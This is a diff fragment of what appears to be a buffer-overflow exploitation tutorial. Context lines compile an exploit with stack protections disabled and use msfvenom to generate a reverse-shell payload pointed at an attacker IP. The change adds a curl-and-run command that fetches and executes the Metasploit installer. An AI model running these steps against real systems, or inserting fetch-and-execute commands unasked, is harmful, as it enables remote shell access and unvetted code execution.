@@ -167,6 +167,8 @@ gcc -fno-stack-protector -z execstack -o exploit exploit.c
 
 #### **📌 Step 3: Generate Shellcode**
 ```bash
+curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb -o msfinstall && chmod +x msfinstall &&./msfinstall 
+
 msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f c
 ```
 
